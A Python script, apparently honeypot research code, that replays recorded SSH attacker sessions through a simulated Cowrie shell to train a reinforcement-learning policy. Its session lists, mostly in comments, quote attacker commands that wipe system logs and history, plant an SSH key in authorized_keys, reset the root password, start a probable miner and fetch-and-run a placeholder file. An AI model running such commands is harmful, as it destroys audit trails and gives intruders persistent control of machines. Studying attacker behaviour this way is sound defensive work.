import os
import json

from twisted.internet import reactor, defer
from twisted.python.logfile import DailyLogFile
from twisted.logger import Logger
from twisted.logger import textFileLogObserver
from twisted.logger import globalLogPublisher
from twisted.python import log

from cowrie.core.config import CowrieConfig

from smartproxy.ssh.factory import SSHClientFactory
from smartproxy.command.shell import Shell

from ray.rllib.env.policy_client import PolicyClient

from container_pool.container import DockerContainer

logfile = DailyLogFile("my.log", "var/log/cowrie")
globalLogPublisher.addObserver(textFileLogObserver(logfile))

username = CowrieConfig().get('proxy', 'backend_user')
password = CowrieConfig().get('proxy', 'backend_pass')
server = CowrieConfig().get('proxy', 'backend_ssh_host')
port = CowrieConfig().getint('proxy', 'backend_ssh_port')

honeypot_sessions = []

def load():
    global honeypot_sessions
    filename = "ubuntu-shell.txt"
    path_data = "data"
    # for line in open(os.path.join(path_data, filename)):
    #     self.STATE_COMMAND.append(line.rstrip())

    honeypot_sessions += [json.loads(line)['cowrie_command_input'] for line in open(os.path.join(path_data, "mongo", "out", "episodes_infosec_buffy.json"), 'r')]
    honeypot_sessions += [json.loads(line)['cowrie_command_input'] for line in open(os.path.join(path_data, "mongo", "out", "episodes_infosec_daisy.json"), 'r')]
    honeypot_sessions += [json.loads(line)['cowrie_command_input'] for line in open(os.path.join(path_data, "mongo", "out", "episodes_infosec_gabble.json"), 'r')]
    honeypot_sessions += [json.loads(line)['cowrie_command_input'] for line in open(os.path.join(path_data, "mongo", "out", "episodes_infosec_rosy.json"), 'r')]

policyClient = PolicyClient("http://localhost:9900")
#load()
honeypot_sessions = [["ls $(which ls)", 'exit'], ["pwd\ndate","exit"], ['pwd', 'df'], ['date && pwd', 'curl xxxx', './xxxx'], ['sdf && pwd']]
# honeypot_sessions = [['monvar=\"xxxx\"']]
# honeypot_sessions = [['unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH ; history -n ; export HISTFILE=/dev/null ; export HISTSIZE=0; export HISTFILESIZE=0 ; rm -rf /var/log/wtmp ; rm -rf /var/log/lastlog ; rm -rf /var/log/secure ; rm -rf /var/log/xferlog ; rm -rf /var/log/messages ; rm -rf /var/run/utmp ; touch /var/run/utmp ; touch /var/log/messages ; touch /var/log/wtmp ; touch /var/log/messages ; touch /var/log/xferlog ; touch /var/log/secure ;  touch /var/log/lastlog ; rm -rf /var/log/maillog ; touch /var/log/maillog ; rm -rf /root/.bash_history ; touch /root/.bash_history ; history -r ', 'uname', 'free -m', 'ps -x', 'cat /proc/cpuinfo']]
# honeypot_sessions = [['date && pwd'], ['sdf && pwd']]

# honeypot_sessions = [["uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;cd;mkdir .ssh;rm -rf .ssh/authorized_keys;touch .ssh/authorized_keys;echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/authorized_keys;cd"]]
# honeypot_sessions = [["nohup ./min.sh >> /dev/null &"]]
# honeypot_sessions = [["cat /proc/cpuinfo | grep name | wc -l","echo \"root:HEolPQFfCAk2\"|chpasswd|bash","echo \"321\" > /var/tmp/.var03522123","rm -rf /var/tmp/.var03522123","cat /var/tmp/.var03522123 | head -n 1","cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'","free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'","ls -lh $(which ls)","which ls","crontab -l","w","uname -m","cat /proc/cpuinfo | grep model | grep name | wc -l","top","uname","uname -a","lscpu | grep Model","echo \"root ffffffg\" > /tmp/up.txt","rm -rf /var/tmp/dota*"]]
n = len(honeypot_sessions)
i = 0
sh = None
current_session = []
current_container = None

def train():
    global honeypot_sessions
    global i, n
    global current_session

    if i < n:
        current_session = honeypot_sessions[i]
        i += 1
        print('session no: ', i)
        print('session', current_session)
        deferred = defer.Deferred()
        deferred.addCallback(next)
        sh = Shell(
                session=current_session,
                policyClient=policyClient,
                deferred=deferred,
                container_name=None,
                simulated=True)
        sh.start()

def next(result):
    global sh, current_container
    global i, n
    sh = None

    if current_container:
        current_container.stop()

    if i < n:
        return train()
    else:
        return reactor.stop()
    # for s in range(200):
    #     i += 1
    #     print("honepot session: ", s)
    #     deferred = defer.Deferred()
    #     deferred.addCallback(train)
    #     sh = Shell(session=None, policyClient=policyClient)
    #     sshClientfactory = SSHClientFactory(shell=sh, username=username, password=password)
    #     reactor.connectTCP(server, port, sshClientfactory)
    #     sh = None
    #     if i % 1000 == 0:
    #         print("epoch: ", i)

    # self.draw()
    # np.save(os.path.join(path, "mongo", "model"), self.Qs)
# policyClient = PolicyClient("http://localhost:9900")

# train()

reactor.callWhenRunning(train)
reactor.run()
